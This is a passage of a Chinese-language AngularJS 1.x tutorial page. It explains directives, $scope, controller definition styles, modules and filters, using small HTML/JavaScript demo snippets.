ng-app=<span class="string">"DemoApp"</span> ng-controller=<span class="string">"DemoController"</span>&gt;</span><br><span class="line">  点击切换字体颜色：&lt;input type=<span class="string">"checkbox"</span> ng-model=<span class="string">"isRed"</span>&gt;</span><br><span class="line">  点击切换背景色：&lt;input type=<span class="string">"checkbox"</span> ng-model=<span class="string">"isGreen"</span>&gt;</span><br><span class="line">  &lt;p ng-<span class="class"><span class="keyword">class</span></span>=<span class="string">"&#123;red: isRed, green: isGreen&#125;"</span>&gt;ng-<span class="class"><span class="keyword">class</span> 的使用&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">ul</span>&gt;&lt;<span class="title">li</span> <span class="title">ng</span>-<span class="title">repeat</span></span>=<span class="string">"friend in friends"</span> ng-<span class="class"><span class="keyword">class</span>-<span class="title">odd</span></span>=<span class="string">"'bgRed'"</span> ng-<span class="class"><span class="keyword">class</span>-<span class="title">even</span></span>=<span class="string">"&#123;bgGreen: isGreen&#125;"</span>&gt;</span><br><span class="line">    &#123;&#123;friend.name&#125;&#125; - &#123;&#123;friend.age&#125;&#125; - &#123;&#123;friend.gender&#125;&#125;</span><br><span class="line">  &lt;<span class="regexp">/li&gt;&lt;/u</span>l&gt;</span><br><span class="line">  &lt;script src=<span class="string">"../code/js/angular.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  angular.module(<span class="string">'DemoApp'</span>, []).controller(<span class="string">'DemoController'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">    $scope.friends = [&#123;<span class="attr">name</span>:<span class="string">'John'</span>, <span class="attr">age</span>:<span class="number">25</span>, <span class="attr">gender</span>:<span class="string">'boy'</span>&#125;, &#123;<span class="attr">name</span>:<span class="string">'John'</span>, <span class="attr">age</span>:<span class="number">25</span>, <span class="attr">gender</span>:<span class="string">'boy'</span>&#125;, &#123;<span class="attr">name</span>:<span class="string">'Jessie'</span>, <span class="attr">age</span>:<span class="number">30</span>, <span class="attr">gender</span>:<span class="string">'girl'</span>&#125;];</span><br><span class="line">  &#125;]);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure><h4 id="ng-cloak"><a href="#ng-cloak" class="headerlink" title="ng-cloak"></a>ng-cloak</h4><h4 id="ng-hide-show-if-switch"><a href="#ng-hide-show-if-switch" class="headerlink" title="ng-hide-show-if-switch"></a>ng-hide-show-if-switch</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;body ng-app=<span class="string">"DemoApp"</span> ng-controller=<span class="string">"DemoController"</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">"checkbox"</span> ng-model=<span class="string">"loading"</span>&gt;</span><br><span class="line">  &lt;img ng-show=<span class="string">"loading"</span> src=<span class="string">"img/loading-green-3.gif"</span> alt=<span class="string">""</span>&gt;</span><br><span class="line">  &lt;img ng-hide=<span class="string">"!loading"</span> src=<span class="string">"img/loading-green-3.gif"</span> alt=<span class="string">""</span>&gt;</span><br><span class="line">  &lt;select ng-model=<span class="string">"selection"</span>&gt;</span><br><span class="line">    &lt;option ng-repeat=<span class="string">"city in cities"</span> value=<span class="string">"&#123;&#123;city.id&#125;&#125;"</span>&gt;&#123;&#123;city.name&#125;&#125;&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>select&gt;</span><br><span class="line">  &lt;div ng-<span class="keyword">switch</span> on=<span class="string">"selection"</span>&gt;</span><br><span class="line">    &lt;div ng-<span class="keyword">switch</span>-when=<span class="string">"1"</span>&gt;北京&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div ng-switch-when="2"&gt;上海&lt;/</span>div&gt;</span><br><span class="line">    &lt;div ng-<span class="keyword">switch</span>-when=<span class="string">"3"</span>&gt;广州&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;img ng-<span class="keyword">if</span>=<span class="string">"loading"</span> src=<span class="string">"./img/loading-green-3.gif"</span> alt=<span class="string">""</span>&gt;</span><br><span class="line">  &lt;script src=<span class="string">"../code/js/angular.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    angular.module(<span class="string">'DemoApp'</span>, []).controller(<span class="string">'DemoController'</span>, [<span class="string">'$scope'</span>, <span class="string">'$timeout'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope, $timeout</span>) </span>&#123;</span><br><span class="line">      $scope.loading = <span class="literal">true</span>;</span><br><span class="line">      setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="comment">// 如果在普通的定时器函数内部修改了 $scope 视图模型成员，一定要通过 $scope.$apply() 手动刷新视图模型才行</span></span><br><span class="line">          $scope.loading = <span class="literal">false</span>;</span><br><span class="line">          $scope.$apply();</span><br><span class="line">        &#125;, <span class="number">10000</span>)</span><br><span class="line">        <span class="comment">// $timeout(function () &#123;</span></span><br><span class="line">        <span class="comment">//   $scope.loading = false;</span></span><br><span class="line">        <span class="comment">// &#125;, 2000);</span></span><br><span class="line">      $scope.cities = [&#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">'北京'</span>&#125;, &#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">'上海'</span>&#125;, &#123;<span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">'广州'</span>&#125;];</span><br><span class="line">    &#125;]);</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure><blockquote><p>ng-if-hide-show 的区别</p></blockquote><ul><li>ng-if 是直接就不渲染这个 DOM 了<ul><li>当为 true 的时候直接渲染</li><li>当为 false 的时候直接移除该元素</li></ul></li><li>ng-hide/ng-show<ul><li>两者无论是 true 还是 false 元素都在，是通过样式来控制的</li></ul></li></ul><h4 id="ng-src"><a href="#ng-src" class="headerlink" title="ng-src"></a>ng-src</h4><p>所有需要动态指定 src 的地方都通过 ng-src 来替换，否则浏览器会真的对这个 src 发起请求</p><h4 id="其它常用指令"><a href="#其它常用指令" class="headerlink" title="其它常用指令"></a>其它常用指令</h4><ul><li>ng-checked : 单选/复选是否选中，只是单向绑定数据</li><li>ng-disabled : 是否禁用</li><li>ng-readonly : 是否只读</li><li>ng-selected : 是否选中，只是单向数据绑定</li></ul><h4 id="事件型指令"><a href="#事件型指令" class="headerlink" title="事件型指令"></a>事件型指令</h4><ul><li>ng-click ：鼠标单击</li><li>ng-blur ：失去焦点</li><li>ng-focus ：得到焦点</li><li>ng-change ：发生改变</li><li>ng-copy ：拷贝完成</li><li>ng-dblclick ：鼠标双击</li><li>ng-submit：表单提交</li><li>ng-copy</li><li>ng-cut</li><li>ng-paste</li><li>ng-keydown</li><li>ng-keyup</li><li>ng-mousedown</li><li>ng-mouseenter</li><li>ng-mouseleave</li><li>ng-mouseover</li><li>ng-mouseup</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;ng - 购物车计价器&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body ng-app ng-init=<span class="string">"price=9.9; count=6;"</span>&gt;</span><br><span class="line">  单价：</span><br><span class="line">  &lt;input type=<span class="string">"number"</span> ng-model=<span class="string">"price"</span>&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;button ng-click=<span class="string">"count = count - 1 &lt;= 0 ? 0 : count - 1"</span>&gt;-&lt;/button&gt;</span><br><span class="line">  &lt;span&gt;&#123;&#123;count&#125;&#125;&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">  &lt;button ng-click="count = count + 1"&gt;+&lt;/</span>button&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123;price * count | number:<span class="number">2</span>&#125;&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;p&gt;&#123;&#123;'abc' | uppercase&#125;&#125;&lt;/</span>p&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123;<span class="string">'ABC'</span> | lowercase&#125;&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script src="js/</span>angular.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>ng 中也提供了一些单向数据绑定的指令</p></blockquote><p>也就是说只能通过模型获取到数据，但是不能通过改变元素值而影响视图模型数据。</p><h2 id="视图数据模型：-scope"><a href="#视图数据模型：-scope" class="headerlink" title="视图数据模型：$scope"></a>视图数据模型：$scope</h2><ul><li>$scope 是用来视图和数据之间的胶水、粘合剂</li><li>视图和控制器之间的数据桥梁</li><li>用于在视图和控制器之间传递数据</li><li>用来暴露数据模型（数据、行为）</li><li>监视模型数据的变化，做出相应的动作 <code>$scope.$watch</code></li></ul><h3 id="如何设计-scope"><a href="#如何设计-scope" class="headerlink" title="如何设计 $scope"></a>如何设计 $scope</h3><p>根据原型抽象数据和行为：</p><ul><li>数据</li><li>行为</li></ul><h3 id="ViewModel"><a href="#ViewModel" class="headerlink" title="ViewModel"></a>ViewModel</h3><p>ng 官方把自己定义为一个 MVC 框架。很多开发使用者把它称之为 MVVM 框架。</p><ul><li>$scope 实际上就是 MVVM 中所谓的 VM（视图模型）</li><li>正式因为 $scope 在 ng 中大量使用甚至盖过了 c 的概念，所以很多人把 ng 称之为 mvvm 框架</li></ul><h3 id="数据模型作用域"><a href="#数据模型作用域" class="headerlink" title="数据模型作用域"></a>数据模型作用域</h3><p>把所有的根据视图抽象出来的成员都放到一个控制器函数中也就是都放到到一个 $scoep 中，绝对没有问题，但是这么做，可维护性太差了，毫不相干的业务都放到一起了。所以就可以为不同的业务视图划分不同的作用域，根据不同的业务划分不同的控制器函数，得到对应的 $scope 作用域数据模型对象，不同的作用域作用于不同的视图访问不同的数据和行为，作用域可以嵌套，可以访问嵌套关系的作用域成员。</p><p>ng 1.5 以下版本使用视图数据模型定义过程：</p><ol><li>引包</li><li>定义全局控制器函数<ul><li>主要目的就是为了把逻辑写到 JavaScript 代码中</li><li>其次是为了拿到那个 $scope 数据模型对象</li><li>然后通过操作 $scoep 数据模型，和视图作交互</li></ul></li><li>根据视图暴露模型数据成员<ul><li>给 $scope 初始化一些数据成员</li><li>同时暴露一些行为函数</li></ul></li><li>设置入口标识 ng-app<ul><li>设置控制器<ul><li>目的就是为了让你的视图和 $scope 建立作用关系</li><li>通过操作 $scope 和视图交互</li><li>把以前对 DOM 的操作变成对 $scope 数据模型对象的操作</li></ul></li></ul></li></ol><p><strong>在 ng 1.5 之后，就不允许定义全局控制器函数了</strong></p><h2 id="控制器：Controller"><a href="#控制器：Controller" class="headerlink" title="控制器：Controller"></a>控制器：Controller</h2><ul><li>ng 中的控制器用来对 scope 进行操作<ul><li>包括初始化数据和定义事件响应函数等</li></ul></li><li>ng 用来解耦业务逻辑层和视图层的关键</li><li>controller 操作 scope，View 则展现 scope 的内容</li><li>传统前端程序中大量复杂的 DOM 操作逻辑都被转变成对 scope 的操作</li></ul><h3 id="定义控制器的三种方式"><a href="#定义控制器的三种方式" class="headerlink" title="定义控制器的三种方式"></a>定义控制器的三种方式</h3><p>定义控制器可以有三种方式，注意第一种已经被淘汰。</p><p>第一种：传统方式，使用全局函数定义控制器：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DemoCtrl</span>(<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// code here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二种：挂载在某个模块下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">angular.module(<span class="string">'DemoApp'</span>, [])</span><br><span class="line">  .controller(<span class="string">'DemoCtrl'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// code here</span></span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>第三种：最正确的方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解决因为代码压缩造成注入对象失败问题的方式就是将第二个参数换成一个数组</span></span><br><span class="line">angular.module(<span class="string">'DemoApp'</span>, [])</span><br><span class="line">  .controller(<span class="string">'DemoCtrl'</span>, [<span class="string">'$scope'</span>, <span class="string">'$log'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope, $log</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// code here</span></span><br><span class="line">  &#125;])</span><br></pre></td></tr></table></figure><p>控制器定义例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;ng - 控制器&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body ng-app=<span class="string">"DemoApp"</span>&gt;</span><br><span class="line">  &lt;div ng-controller=<span class="string">"DemoController"</span>&gt;</span><br><span class="line">    &#123;&#123;name&#125;&#125;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div ng-controller="Demo1Controller"&gt;</span></span><br><span class="line"><span class="regexp">    &#123;&#123;name&#125;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;div ng-controller=<span class="string">"Demo2Controller"</span>&gt;</span><br><span class="line">    &#123;&#123;name&#125;&#125;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script src="js/</span>angular<span class="number">-1.2</span><span class="number">.3</span>.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;script&gt;</span></span><br><span class="line"><span class="string">    // 在 ng 1.5 之后，就不允许定义全局控制器函数了</span></span><br><span class="line"><span class="string">    // 之前定义控制器的方式也有解决方案，就是模块化，已不再使用</span></span><br><span class="line"><span class="string">    function DemoController($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.foo = 'bar';</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    // 创建控制器，有问题，启用标识符混淆压缩会把 $scope 压缩掉，代码就报错了</span></span><br><span class="line"><span class="string">    var demoApp = angular.module('DemoApp', []).controller('DemoController', function ($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.name = 'DemoController';</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    // 通过模块变量定义控制器</span></span><br><span class="line"><span class="string">    demoApp.controller('Demo1Controller', function ($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.name = 'Demo1Controller';</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    // 这里表示直接获取，前提是 DemoApp 已经定义过了</span></span><br><span class="line"><span class="string">    angular.module('DemoApp').controller('Demo2Controller', function ($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.name = 'Demo2Controller';</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    // 以上三种形式都是基于模块定义控制器，链式编程、通过模块变量定义、通过获取模块定义 都一样，想用哪种用哪种</span></span><br><span class="line"><span class="string">    // 创建控制器最正确的方式，这种方式不会被混淆代码压缩影响</span></span><br><span class="line"><span class="string">    var demoApp = angular.module('DemoApp', []).controller('DemoController', ['$scope', function ($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.name = 'DemoController';</span></span><br><span class="line"><span class="string">    &#125;]);</span></span><br><span class="line"><span class="string">    demoApp.controller('Demo1Controller', ['$scope', function ($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.name = 'Demo1Controller';</span></span><br><span class="line"><span class="string">    &#125;]);</span></span><br><span class="line"><span class="string">    angular.module('DemoApp').controller('Demo2Controller', ['$scope', function ($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.name = 'Demo2Controller';</span></span><br><span class="line"><span class="string">    &#125;]);</span></span><br><span class="line"><span class="string">  &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><h3 id="如何划分控制器"><a href="#如何划分控制器" class="headerlink" title="如何划分控制器"></a>如何划分控制器</h3><p>一个页面中，按照不同的功能业务划分不同的控制器。</p><h2 id="模块：Module"><a href="#模块：Module" class="headerlink" title="模块：Module"></a>模块：Module</h2><ul><li>模块定义了一个应用程序</li><li>模块是应用程序中不同部分的容器</li><li>模块是应用控制器的容器</li><li>控制器通常属于一个模块</li></ul><p>ng 中模块的引入最重要的目的就是为了解决原来全局定义的控制器污染的问题，还有一个目的就是让我们以模块的形式划分架构。</p><blockquote><p>可以通过 <code>angular.module()</code> 方法操作模块<br>注意：该方法只有在传入两个参数时才会创建模块，否则为获取已有模块</p></blockquote><h3 id="定义模块"><a href="#定义模块" class="headerlink" title="定义模块"></a>定义模块</h3><p>定义一个模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意：必须指定第二个参数，否则变成获取已定义的模块</span></span><br><span class="line"><span class="keyword">var</span> demoApp = angular.module(<span class="string">'DemoApp'</span>, [])</span><br></pre></td></tr></table></figure><p>获取已有模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> demoApp = angular.module(<span class="string">'DemoApp'</span>)</span><br></pre></td></tr></table></figure><p>定义依赖别的模块的模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> demoApp = angular.module(<span class="string">'DemoApp'</span>, [<span class="string">'Module1'</span>, <span class="string">'Module2'</span>])</span><br></pre></td></tr></table></figure><blockquote><p>定义模块和控制器(利用模块定义控制器)</p></blockquote><ol><li>定义一个模块 angular.module(‘模块名’, [])<ul><li>如果是一个参数，就表示获取一个模块</li><li>如果两个参数，第二个参数就必须是一个数组<ul><li>这个数组表示该模块的依赖，空数组表示没有任何依赖，同时创建该模块</li><li>如果有依赖，在数组中指定依赖的模块名即可</li></ul></li></ul></li><li>在该模块下去定义控制器</li><li>将模块和控制器作用到视图</li></ol><h3 id="如何划分模块"><a href="#如何划分模块" class="headerlink" title="如何划分模块"></a>如何划分模块</h3><h3 id="加载多个模块"><a href="#加载多个模块" class="headerlink" title="加载多个模块"></a>加载多个模块</h3><ul><li><code>angular.bootstrap(document, [&#39;demo&#39;])</code></li><li><code>angular.module(&#39;MainModule&#39;, [&#39;Module1&#39;, &#39;Module2&#39;, &#39;Module3&#39;[,ModuleName]])</code></li></ul><p>模块例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;ng - 模块&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body ng-app=<span class="string">"MainModule"</span>&gt;</span><br><span class="line">  &lt;div ng-controller=<span class="string">"Demo1Controller"</span>&gt;</span><br><span class="line">    &#123;&#123;name&#125;&#125;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div ng-controller="Demo2Controller"&gt;</span></span><br><span class="line"><span class="regexp">    &#123;&#123;name&#125;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;div ng-controller=<span class="string">"MainController"</span>&gt;</span><br><span class="line">    &#123;&#123;name&#125;&#125;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script src="js/</span>angular.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;script&gt;</span></span><br><span class="line"><span class="string">    // 创建了一个模块（没有任何依赖项）</span></span><br><span class="line"><span class="string">    // Angular 中的模块不像一些 CMD、CommonJS、AMD 等模块定义规范</span></span><br><span class="line"><span class="string">    //         有输入有输出</span></span><br><span class="line"><span class="string">    //         Angular 中的模块中的输入与输出（加载模块依赖、暴露模块成员）体现不够明显</span></span><br><span class="line"><span class="string">    // Angular 中的模块也不能通过代码去主动的加载另一个模块</span></span><br><span class="line"><span class="string">    // Angular 中的模块唯一体现的地方在于：</span></span><br><span class="line"><span class="string">    //    1. 解决原来全局控制器命名污染的问题</span></span><br><span class="line"><span class="string">    //    2. 解决按照不同的页面，将不同的控制器组织到一起</span></span><br><span class="line"><span class="string">    angular.module('Demo1App', []).controller('Demo1Controller', ['$scope', function ($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.name = 'Demo1Controller';</span></span><br><span class="line"><span class="string">    &#125;]).controller('MainController', ['$scope', function($scope)&#123;</span></span><br><span class="line"><span class="string">      $scope.name = 'Demo1App MainController';</span></span><br><span class="line"><span class="string">    &#125;]);</span></span><br><span class="line"><span class="string">    angular.module('Demo2App', []).controller('Demo2Controller', ['$scope', function ($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.name = 'Demo2Controller';</span></span><br><span class="line"><span class="string">    &#125;]);</span></span><br><span class="line"><span class="string">    // 手动引导模块的启动，可以启动多个模块，但是都必须作用到一个元素上；这种方式不推荐使用</span></span><br><span class="line"><span class="string">    angular.bootstrap(document.getElementById('body'), ['Demo1App', 'Demo2App']);</span></span><br><span class="line"><span class="string">    // 定义一个主模块，加载依赖的模块</span></span><br><span class="line"><span class="string">    angular.module('MainModule', ['Demo1App', 'Demo2App']).controller('MainController', ['$scope', function ($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.name = 'MainModule MainController';</span></span><br><span class="line"><span class="string">    &#125;]);</span></span><br><span class="line"><span class="string">  &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><h2 id="过滤器：Filter"><a href="#过滤器：Filter" class="headerlink" title="过滤器：Filter"></a>过滤器：Filter</h2><h3 id="内置过滤器"><a href="#内置过滤器" class="headerlink" title="内置过滤器"></a>内置过滤器</h3><ul><li>currency</li><li>number</li><li>date</li><li>json</li><li>uppercase</li><li>lowercase</li><li>orderBy</li><li>limitTo</li><li>filter</li></ul><h3 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;body ng-app=<span class="string">"DemoApp"</span> ng-controller=<span class="string">"DemoController"</span>&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123;time | date:<span class="string">'yyyy-MM-dd HH:mm:ss'</span>&#125;&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;p&gt;&#123;&#123;time | date:'yyyy-MM-dd HH:mm:ss Z'&#125;&#125;&lt;/</span>p&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123;time | date:<span class="string">'yyyy-MM-dd HH:mma'</span>&#125;&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;p&gt;&#123;&#123;time | date:'medium'&#125;&#125;&lt;/</span>p&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; user | json &#125;&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;pre&gt;&#123;&#123; user | json:4 &#125;&#125;&lt;/</span>pre&gt;&lt;hr&gt;</span><br><span class="line">  &lt;label for=""&gt;搜索：&lt;/label&gt;&lt;input type="text" ng-model="searchText"&gt;</span><br><span class="line">  &lt;table&gt;</span><br><span class="line">    &lt;thead&gt;&lt;tr&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;电话&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;</span><br><span class="line">    &lt;tbody&gt;&lt;tr ng-repeat="friend in friends | filter:searchText track by $index"&gt;&lt;td&gt;&#123;&#123;friend.name&#125;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#123;friend.phone&#125;&#125;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;</span><br><span class="line">  &lt;/table&gt;&lt;hr&gt;&lt;hr&gt;</span><br><span class="line">  &lt;label&gt;匹配任意项: &lt;input ng-model="search.$"&gt;&lt;/label&gt; &lt;br&gt; &#123;$: 'xxx'&#125;</span><br><span class="line">  &lt;label&gt;根据名字筛选： &lt;input ng-model="search.name"&gt;&lt;/label&gt;&lt;br&gt; &#123;name: 